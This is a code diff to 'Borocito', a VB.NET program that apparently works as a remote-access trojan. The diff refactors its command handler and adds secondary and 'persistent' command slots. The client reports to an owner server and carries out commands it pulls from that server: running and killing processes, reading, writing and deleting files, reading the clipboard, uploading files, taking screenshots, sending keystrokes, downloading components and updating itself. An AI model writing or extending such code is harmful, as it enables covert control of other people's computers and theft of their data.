@@ -91,6 +91,7 @@ Module StartUp
     Sub Init()
         AddToLog("Init", "Borocito " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Try
+            Threading.Thread.Sleep(1500)
             'Iniciar desde otra ubicacion
             RunFromLocation()
             'Evita multi-instancias
@@ -122,8 +123,6 @@ Module StartUp
                 ReportMeToServer()
                 'Guardar existencia
                 SetExistence()
-                'Enviar telemetria
-                SendFirstTelemetry()
                 'Reiniciar
                 RestartBorocito()
             End If
@@ -184,6 +183,7 @@ Module StartUp
     Sub RestartBorocito()
         Try
             AddToLog("RestartBorocito@StartUp", "Restarting...", False)
+            SendFirstTelemetry()
             Process.Start(Application.ExecutablePath)
             End
         Catch ex As Exception
@@ -243,6 +243,8 @@ Module Network
     Dim IsrefreshTelemetryThreadRunning As Boolean = False
     Dim IsCommandReaderThreadRunning As Boolean = False
     Dim IsConfigReaderThreadRunning As Boolean = False
+    Dim PersistentProccessed As Boolean = False
+    Dim PersistentCommand As String = Nothing
     Dim ThreadReadCMDServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadCommandFile))
     Dim ThreadReadGeneralConfigServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadConfigFile))
     Sub ReportMeToServer()
@@ -311,6 +313,7 @@ Module Network
     End Sub
     Sub SendFirstTelemetry()
         Try
+            AddToLog("Network", "Sending first telemetry...", False)
             Dim reportContent As String = tlmContent
             Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/telemetryPost.php")
             request.Method = "POST"
@@ -401,7 +404,7 @@ Module Network
             Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                 vbCrLf & "Command1>" &
                 vbCrLf & "Command2>" &
-                vbCrLf & "Command3>" &
+                vbCrLf & "Command3>" & PersistentCommand &
                 vbCrLf & "[Response]" &
                 vbCrLf & CMDResponse
             Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
@@ -473,156 +476,16 @@ Module Network
                 Dim tempString As String = Nothing
                 Dim CommandResponse As String = Nothing
 
-                Dim CMD1 As String = Lineas(1).Split(">"c)(1).Trim() 'Es el comando principal en crudo
-                Dim CMD2 As String = Lineas(2).Split(">"c)(1).Trim()
-                Dim CMD3 As String = Lineas(3).Split(">"c)(1).Trim()
+                Dim CMD1 As String = Lineas(1).Split(">"c)(1).Trim() 'Comando principal
+                Dim CMD2 As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
+                Dim CMD3 As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
+                PersistentCommand = CMD3
+
+                'Las respuestas generadas por cada comando deben ser concatenadas con la respuesta del anterior, luego de eso, debe ser enviada.
+                '   Asi se mostrara la respuesta (separada por cada linea) de cada comando
 
                 If CMD1 <> Nothing Then
-                    Dim CommandCMD As String = CMD1
-                    AddToLog("ReadCommandFile@Network", "Processing: " & CMD1)
-                    Try
-                        If CommandCMD.Contains("=") Then
-                            CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
-                        End If
-                        If CommandCMD.Contains("%username%") Then
-                            CommandCMD = CommandCMD.Replace("%username%", Environment.UserName)
-                        End If
-                        If CMD1.StartsWith("MsgBox=") Then
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            If My.Computer.FileSystem.FileExists(DIRTemp & "\MessageBoxBRO.vbs") Then
-                                My.Computer.FileSystem.DeleteFile(DIRTemp & "\MessageBoxBRO.vbs")
-                            End If
-                            My.Computer.FileSystem.WriteAllText(DIRTemp & "\MessageBoxBRO.vbs", "a = MsgBox(" & """" & Arg(0) & """" & "," & Arg(1) & "," & """" & Arg(2) & """" & ")", False, Encoding.ASCII)
-                            Process.Start(DIRTemp & "\MessageBoxBRO.vbs")
-
-                        ElseIf CMD1.StartsWith("/Pause=") Then
-                            SendCommandResponse("Borocito has been to pause for '" & CommandCMD & "' ms")
-                            Threading.Thread.Sleep(CommandCMD)
-
-                        ElseIf CMD1 = "/Memory.Save()" Then
-                            SaveRegedit()
-                        ElseIf CMD1 = "/Memory.Load()" Then
-                            LoadRegedit()
-
-                            '<--- Windows --->
-                        ElseIf CMD1.StartsWith("/Windows.Process.Start=") Then
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            CommandResponse = ProcessStart(Arg(0), Arg(1))
-
-                        ElseIf CMD1.StartsWith("/Windows.Process.Stop=") Then
-                            CommandResponse = ProcessStop(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.Process.Get()") Then
-                            CommandResponse = ProcessGet()
-
-                        ElseIf CMD1.StartsWith("/Windows.FileSystem.GetDirectory=") Then
-                            CommandResponse = FileSystemGetDirectory(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.FileSystem.GetFiles=") Then
-                            CommandResponse = FileSystemGetFiles(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.FileSystem.Read=") Then
-                            CommandResponse = FileSystemRead(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.FileSystem.Write=") Then
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            CommandResponse = FileSystemWrite(Arg(0), Arg(1), Arg(2))
-
-                        ElseIf CMD1.StartsWith("/Windows.FileSystem.DirCreate=") Then
-                            CommandResponse = FileSystemDirCreate(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.FileSystem.Delete=") Then
-                            CommandResponse = FileSystemDelete(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.Clipboard.Set=") Then
-                            CommandResponse = ClipboardSet(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Windows.Clipboard.Get()") Then
-                            CommandResponse = ClipboardGet()
-
-                        ElseIf CMD1.StartsWith("/Windows.System.GetHost()") Then
-                            CommandResponse = SystemGetHost()
-
-                            '<--- Payloads --->
-                        ElseIf CMD1.StartsWith("/Payloads.DownloadComponent=") Then 'Funciona.
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            CommandResponse = Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))
-
-                        ElseIf CMD1.StartsWith("/Payloads.Upload.File=") Then 'Funciona.
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            CommandResponse = Payloads.uploadAfile(Arg(0), Arg(1))
-
-                        ElseIf CMD1.StartsWith("/Payloads.SendTheKeys=") Then 'Funciona.
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            CommandResponse = Payloads.SendTheKeys(Arg(0), Arg(1))
-
-                        ElseIf CMD1.StartsWith("/Payloads.TakeScreenshot()") Then 'Funciona.
-                            CommandResponse = Payloads.TakeAnScreenshot()
-
-                        ElseIf CMD1.StartsWith("/Payloads.Inputs=") Then 'Funciona.
-                            CommandResponse = Payloads.Inputs(CommandCMD)
-
-                        ElseIf CMD1.StartsWith("/Payloads.PostNotify=") Then 'Funciona.
-                            Dim Arg() As String = CommandCMD.Split(",")
-                            CommandResponse = Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))
-
-                            '<--- Borocito Tools --->
-                        ElseIf CMD1.StartsWith("/Stop") Then 'Funciona.
-                            SendCommandResponse("Borocito has been called to close")
-                            AddToLog("Network", "Borocito has been called to close!", True)
-                            SendTelemetry()
-                            End
-
-                        ElseIf CMD1.StartsWith("/Restart") Then 'Funciona.
-                            SendCommandResponse("Borocito has been called to restart")
-                            AddToLog("Network", "Borocito has been called to restart!", True)
-                            SendTelemetry()
-                            Restart()
-
-                        ElseIf CMD1.StartsWith("/Uninstall") Then 'Funciona.
-                            SendCommandResponse("Borocito has been called to uninstall!")
-                            AddToLog("Network", "Borocito has been called to uninstall!", True)
-                            SendTelemetry()
-                            Uninstall()
-
-                        ElseIf CMD1.StartsWith("/Update") Then 'Funciona.
-                            SendCommandResponse("Borocito has been called to Update")
-                            AddToLog("Network", "Borocito has been called to Update!", True)
-                            SendTelemetry()
-                            Update()
-
-                        ElseIf CMD1.StartsWith("/ForceUpdate") Then 'Funciona.
-                            SendCommandResponse("Borocito has been called to Force the Update")
-                            AddToLog("Network", "Borocito has been called to Force the Update!", True)
-                            SendTelemetry()
-                            Update("/ForceUpdate")
-
-                        ElseIf CMD1.StartsWith("/Reset") Then 'Funciona.
-                            SendCommandResponse("Borocito has been called to Reset")
-                            AddToLog("Network", "Borocito has been called to Reset!", True)
-                            SendTelemetry()
-                            Extractor()
-
-                        ElseIf CMD1.StartsWith("/SendTelemetry") Then 'Funciona.
-                            CommandResponse = "Sending located telemetry..."
-                            AddToLog("Network", "Borocito has been called to send telemetry!", True)
-                            SendTelemetry()
-
-                        ElseIf CMD1.StartsWith("/Heartbeat") Then 'Funciona.
-                            CommandResponse = "---/\--- (Pum pum...)"
-                            AddToLog("Network", "Hey, Im here!", True)
-
-                        ElseIf CMD1.StartsWith("/Status") Then 'Funciona.
-                            CommandResponse = My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName
-
-                        ElseIf CMD1.StartsWith("boro-get") Then 'Funciona.
-                            CommandResponse = BORO_GET_ADMIN(CMD1)
-
-                        End If
-                    Catch ex As Exception
-                        CommandResponse = "[" & CMD1 & "]Error: " & ex.Message
-                        AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
-                    End Try
+                    CommandResponse = ProccessCommand(CMD1)
                     If CMD1 = Nothing Then
                     Else
                         If CommandResponse = Nothing Then
@@ -632,11 +495,190 @@ Module Network
                         End If
                     End If
                 End If
+
+                If CMD2 <> Nothing Then
+                    CommandResponse &= vbCrLf & ProccessCommand(CMD2)
+                    If CMD2 = Nothing Then
+                    Else
+                        If CommandResponse = Nothing Then
+                            SendCommandResponse("Ejecuted Secundary " & CMD2 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
+                        Else
+                            SendCommandResponse(CommandResponse)
+                        End If
+                    End If
+                End If
+
+                If Not PersistentProccessed Then 'Solo procesa por instancia (una vez)
+                    If CMD3 <> Nothing Then
+                        CommandResponse &= vbCrLf & ProccessCommand(CMD3)
+                        If CMD3 = Nothing Then
+                        Else
+                            If CommandResponse = Nothing Then
+                                SendCommandResponse("Ejecuted Persistent " & CMD3 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
+                            Else
+                                SendCommandResponse(CommandResponse)
+                            End If
+                        End If
+                    End If
+                    PersistentProccessed = True
+                End If
             Catch ex As Exception
                 AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
             End Try
         End While
     End Sub
+    Function ProccessCommand(ByVal command As String) As String
+        Try
+            Dim CommandCMD As String = command
+            AddToLog("ProccessCommand@Network", "Processing: " & command)
+            If CommandCMD.Contains("=") Then
+                CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
+            End If
+            If CommandCMD.Contains("%username%") Then
+                CommandCMD = CommandCMD.Replace("%username%", Environment.UserName)
+            End If
+            If command.StartsWith("MsgBox=") Then
+                Dim Arg() As String = CommandCMD.Split(",")
+                If My.Computer.FileSystem.FileExists(DIRTemp & "\MessageBoxBRO.vbs") Then
+                    My.Computer.FileSystem.DeleteFile(DIRTemp & "\MessageBoxBRO.vbs")
+                End If
+                My.Computer.FileSystem.WriteAllText(DIRTemp & "\MessageBoxBRO.vbs", "a = MsgBox(" & """" & Arg(0) & """" & "," & Arg(1) & "," & """" & Arg(2) & """" & ")", False, Encoding.ASCII)
+                Process.Start(DIRTemp & "\MessageBoxBRO.vbs")
+
+            ElseIf command.StartsWith("/Pause=") Then
+                SendCommandResponse("Borocito has been paused for '" & CommandCMD & "' ms")
+                Threading.Thread.Sleep(CommandCMD)
+
+            ElseIf command = "/Memory.Save()" Then
+                SaveRegedit()
+            ElseIf command = "/Memory.Load()" Then
+                LoadRegedit()
+
+                '<--- Windows --->
+            ElseIf command.StartsWith("/Windows.Process.Start=") Then
+                Dim Arg() As String = CommandCMD.Split(",")
+                Return ProcessStart(Arg(0), Arg(1))
+
+            ElseIf command.StartsWith("/Windows.Process.Stop=") Then
+                Return ProcessStop(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.Process.Get") Then
+                If command.Contains("'") Then
+                    Return ProcessGet(command.Split("'")(1))
+                Else
+                    Return ProcessGet()
+                End If
+
+            ElseIf command.StartsWith("/Windows.FileSystem.GetDirectory=") Then
+                Return FileSystemGetDirectory(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.FileSystem.GetFiles=") Then
+                Return FileSystemGetFiles(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.FileSystem.Read=") Then
+                Return FileSystemRead(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.FileSystem.Write=") Then
+                Dim Arg() As String = CommandCMD.Split(",")
+                Return FileSystemWrite(Arg(0), Arg(1), Arg(2))
+
+            ElseIf command.StartsWith("/Windows.FileSystem.DirCreate=") Then
+                Return FileSystemDirCreate(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.FileSystem.Delete=") Then
+                Return FileSystemDelete(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.Clipboard.Set=") Then
+                Return ClipboardSet(CommandCMD)
+
+            ElseIf command.StartsWith("/Windows.Clipboard.Get()") Then
+                Return ClipboardGet()
+
+            ElseIf command.StartsWith("/Windows.System.GetHost()") Then
+                Return SystemGetHost()
+
+                '<--- Payloads --->
+            ElseIf command.StartsWith("/Payloads.DownloadComponent=") Then 'Funciona.
+                Dim Arg() As String = CommandCMD.Split(",")
+                Return Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))
+
+            ElseIf command.StartsWith("/Payloads.Upload.File=") Then 'Funciona.
+                Dim Arg() As String = CommandCMD.Split(",")
+                Return Payloads.uploadAfile(Arg(0), Arg(1))
+
+            ElseIf command.StartsWith("/Payloads.SendTheKeys=") Then 'Funciona.
+                Dim Arg() As String = CommandCMD.Split(",")
+                Return Payloads.SendTheKeys(Arg(0), Arg(1))
+
+            ElseIf command.StartsWith("/Payloads.TakeScreenshot()") Then 'Funciona.
+                Return Payloads.TakeAnScreenshot()
+
+            ElseIf command.StartsWith("/Payloads.Inputs=") Then 'Funciona.
+                Return Payloads.Inputs(CommandCMD)
+
+            ElseIf command.StartsWith("/Payloads.PostNotify=") Then 'Funciona.
+                Dim Arg() As String = CommandCMD.Split(",")
+                Return Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))
+
+                '<--- Borocito Tools --->
+            ElseIf command.StartsWith("/Stop") Then 'Funciona.
+                SendCommandResponse("Borocito has been called to close")
+                AddToLog("Network", "Borocito has been called to close!", True)
+                SendTelemetry()
+                End
+
+            ElseIf command.StartsWith("/Restart") Then 'Funciona.
+                SendCommandResponse("Borocito has been called to restart")
+                AddToLog("Network", "Borocito has been called to restart!", True)
+                SendTelemetry()
+                Restart()
+
+            ElseIf command.StartsWith("/Uninstall") Then 'Funciona.
+                SendCommandResponse("Borocito has been called to uninstall!")
+                AddToLog("Network", "Borocito has been called to uninstall!", True)
+                SendTelemetry()
+                Uninstall()
+
+            ElseIf command.StartsWith("/Update") Then 'Funciona.
+                SendCommandResponse("Borocito has been called to Update")
+                AddToLog("Network", "Borocito has been called to Update!", True)
+                SendTelemetry()
+                Update()
+
+            ElseIf command.StartsWith("/ForceUpdate") Then 'Funciona.
+                SendCommandResponse("Borocito has been called to Force the Update")
+                AddToLog("Network", "Borocito has been called to Force the Update!", True)
+                SendTelemetry()
+                Update("/ForceUpdate")
+
+            ElseIf command.StartsWith("/Reset") Then 'Funciona.
+                SendCommandResponse("Borocito has been called to Reset")
+                AddToLog("Network", "Borocito has been called to Reset!", True)
+                SendTelemetry()
+                Extractor()
+
+            ElseIf command.StartsWith("/SendTelemetry") Then 'Funciona.
+                Return "Sending located telemetry..."
+                AddToLog("Network", "Borocito has been called to send telemetry!", True)
+                SendTelemetry()
+
+            ElseIf command.StartsWith("/Heartbeat") Then 'Funciona.
+                Return "---/\--- (Pum pum...)"
+                AddToLog("Network", "Hey, Im here!", True)
+
+            ElseIf command.StartsWith("/Status") Then 'Funciona.
+                Return My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName
+
+            ElseIf command.StartsWith("boro-get") Then 'Funciona.
+                Return BORO_GET_ADMIN(command)
+
+            End If
+        Catch ex As Exception
+            AddToLog("ProccessCommand@Network", "Error: " & ex.Message, True)
+            Return "[" & command & "]Error: " & ex.Message
+        End Try
+        Return Nothing
+    End Function
     Sub ReadConfigFile()
         Try
             'Hola querido, resulta que esto todavia no esta programado porque
